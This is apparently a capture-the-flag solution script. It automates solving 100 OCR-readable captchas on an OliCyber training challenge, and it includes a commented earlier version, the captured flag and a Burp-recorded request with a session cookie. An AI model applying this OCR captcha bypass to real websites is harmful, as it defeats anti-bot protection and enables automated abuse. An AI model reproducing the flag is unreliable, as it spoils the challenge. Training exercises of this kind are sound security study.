import io
import requests
import pytesseract
from PIL import Image
from bs4 import BeautifulSoup as bs

r = requests.session()
url = 'http://captcha.challs.olicyber.it'
test = bs(r.get(url).text, features="lxml")
url_post="http://captcha.challs.olicyber.it/next"

for i in range (100):
    image_tag = test.find('img')
    image_src = image_tag['src']
    image_url = url + image_src     # URL dell'immagine
    img = r.get(image_url)
    captcha = Image.open(io.BytesIO(img.content))
    text = pytesseract.image_to_string(captcha).strip()
    response= r.post(url_post, data={"risposta":str(text).encode()})
    test = bs(response.text, features="lxml")
    print(test)



# flag{https://xkcd.com/233/?vjc1GpKF}



'''
import requests
from bs4 import BeautifulSoup as bs
from PIL import Image
import pytesseract
import io

r = requests.session()
url = 'http://captcha.challs.olicyber.it'
test = bs(r.get(url).text, features="lxml")

for i in range(100):
    print(f"Solving test n.{i+1}..", end=" ")

    image_tag = test.find('img')
    image_src = image_tag['src']
    image_url = url + image_src   
    
    img = r.get(image_url)
    img = Image.open(io.BytesIO(img.content))
    num = pytesseract.image_to_string(img).strip() # Numero nel captcha
    
    test = r.post(url + '/next', data={'risposta': str(num).encode()})
    test = bs(test.text, features="lxml")
    
    resp = str(test.find('h1'))
    if 'sbagliata' in resp:
        print(test)
        break
    else:
        print("Done")

print('-------------------------------------------------')
print(resp.strip('<h1>/'))
# flag{https://xkcd.com/233/?vjc1GpKF}
'''

'''
BURP
POST /next HTTP/1.1
Host: captcha.challs.olicyber.it
Content-Length: 17
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://captcha.challs.olicyber.it
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://captcha.challs.olicyber.it/
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=eyJjaGFsbG5hbWUiOiJZeGdSQl84ck8xV0UtUHNPWHpfeVVBLmFxazU0ZVBuWGY0LkR4bWdKOFhHUFZDY1Q4N2hMcDNfYUEiLCJsZXZlbCI6MCwidGltZSI6MTY5MTkxODI0Mi43NDkxNDM2fQ.ZNifog.RV5aXTbuh_4zgsbLvDsM2BNUIsQ
Connection: close

risposta=24777313
'''